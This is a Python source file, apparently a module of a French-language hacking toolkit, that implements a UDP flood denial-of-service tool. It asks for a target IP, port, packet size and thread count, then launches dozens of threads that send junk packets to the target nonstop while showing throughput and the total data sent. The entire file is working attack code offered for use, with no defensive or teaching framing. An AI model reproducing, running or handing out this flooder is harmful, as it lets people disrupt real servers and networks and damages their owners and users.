from Options.Options import *
from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import choices, randint
from time import time, sleep

TitrePage("DDOS")

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force  # default: 1250
        self.threads = threads  # default: 35

        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("x" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def info(self):
        interval = 0.05
        now = time()

        size = 0
        self.total = 0

        bytediff = 8
        mb = 1000000
        gb = 1000000000

        while self.on:
            sleep(interval)
            if not self.on:
                break

            if size != 0:
                self.total += self.sent * bytediff / gb * interval
                TitrePage(f"DDOS | {round(size)} Mo/s | Total: {round(self.total, 1)}Go")
                print(f"{couleur.CYAN}{round(size)} Mo/s{couleur.RED} | Total: {couleur.YELLOW}{round(self.total, 1)}Go", end='\r')

            now2 = time()

            if now + 1 >= now2:
                continue

            size = round(self.sent * bytediff / mb)
            self.sent = 0

            now += 1

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                pass

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)


def main():
    ip = input(f"{couleur.RED}\nIp -> {couleur.RESET}")
    port = input(f"{couleur.RED}\nPort (entrez pour défaut) -> {couleur.RESET}")
    force = input(f"{couleur.RED}\nOctets par paquet (entrez pour défaut) -> {couleur.RESET}")
    threads = input(f"{couleur.RED}\nThreads (entrez pour défaut) -> {couleur.RESET}")

    if force == '':
        force = 1250
    else:
        try:
            force = int(force)
        except ValueError:
            print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un nombre !", couleur.RESET)
            Reset()

    if threads == '':
        threads = 35
    else:
        try:
            threads = int(threads)
        except ValueError:
            print(f"\n{couleur.RED}[INFORMATION] | {couleur.LIGHTRED_EX}Veuillez entrer un nombre !", couleur.RESET)
            Reset()

    print(f"\n{couleur.RED}Lancement de l'attaque sur \"{couleur.CYAN}{ip}{couleur.RED}\".{couleur.RESET}")
    brute = Brutalize(ip, port, force, threads)
    try:
        brute.flood()
    except:
        brute.stop()
        print(f"\n{couleur.RED}[ERREUR] | {couleur.LIGHTRED_EX}Il y a eu une erreur, l'attaque a été stoppée.", couleur.RESET)
        Reset()

    try:
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        brute.stop()
        print(f"{couleur.RED}L'attaque s'est arrêtée. \"{couleur.CYAN}{ip}{couleur.RED}\" a été frappé avec \"{round(brute.total, 1)}Go\".\n")
        Reset()

if __name__ == '__main__':
    main()
